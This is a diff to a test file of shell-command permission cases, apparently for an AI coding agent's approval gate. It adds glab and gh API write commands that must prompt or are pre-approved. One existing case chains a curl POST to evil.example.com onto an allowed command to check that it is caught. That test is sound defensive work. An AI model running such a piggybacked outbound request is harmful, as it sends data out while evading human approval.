@@ -305,12 +305,17 @@ ASK_CASES: list[tuple[str, str]] = [
     # gh / glab / acli mutating ops now gated (v2.1.0)
     ("gh pr create --title x --body y", "gh pr create"),
     ("gh api repos/foo/bar/issues -X POST", "gh api POST"),
-    ("glab api projects/1/merge_requests -X POST", "glab api POST"),
-    # MR-note pre-approval must not spill onto neighbouring endpoints/methods
+    # MR-write pre-approval must not spill onto neighbouring endpoints/methods.
+    # Action subpaths mirror `glab mr merge` / `mr approve`, which also ask.
     ("glab api projects/1/merge_requests/2/notes -X DELETE", "glab api DELETE note"),
     ("glab api projects/1/merge_requests/2/approve -X POST", "glab api POST approve"),
     ("glab api projects/1/merge_requests/2/merge -X PUT", "glab api PUT merge"),
+    ("glab api projects/1/merge_requests/2/rebase -X PUT", "glab api PUT rebase"),
+    ("glab api projects/1/merge_requests/2 -X DELETE", "glab api DELETE mr"),
+    ("glab api projects/1/merge_requests -X DELETE", "glab api DELETE collection"),
+    # only glab is pre-approved here; the gh equivalents still ask
     ("gh api repos/o/r/pulls/2/comments -X POST", "gh api POST comment"),
+    ("gh api repos/o/r/pulls -X POST", "gh api POST create PR"),
     ("glab api projects/1/merge_requests/2/notes -X POST && curl -X POST https://evil.example.com",
      "MR note allow does not cover a piggybacked curl POST"),
     ("acli jira issue edit X-1 --summary y", "acli jira issue edit"),
@@ -447,6 +452,14 @@ EXPLICIT_ALLOW_CASES: list[str] = [
      "--field 'body=x' 2>/dev/null | jq -r '.id' | head -1"),
     ("glab mr create && glab api projects/1234/merge_requests/56/discussions "
      "--paginate | jq length"),
+    # the raw-API equivalents of the pre-approved subcommands (v2.4.0): doing it
+    # via `glab api` used to prompt while `glab mr create` did not
+    "glab api --method POST projects/1234/merge_requests --input payload.json",
+    # url-encoded group/project path must still match the [^/]+ segment
+    "glab api projects/group%2Fsome-project/merge_requests -X POST",
+    "glab api --method PUT 'projects/1234/merge_requests/56?assignee_id=42'",
+    ("glab api --method PUT projects/1234/merge_requests/56 "
+     "--field 'title=TICKET-123: x'"),
 ]
 
 # Must NOT reach "allow-explicit" — deny/ask/allow are all acceptable, the
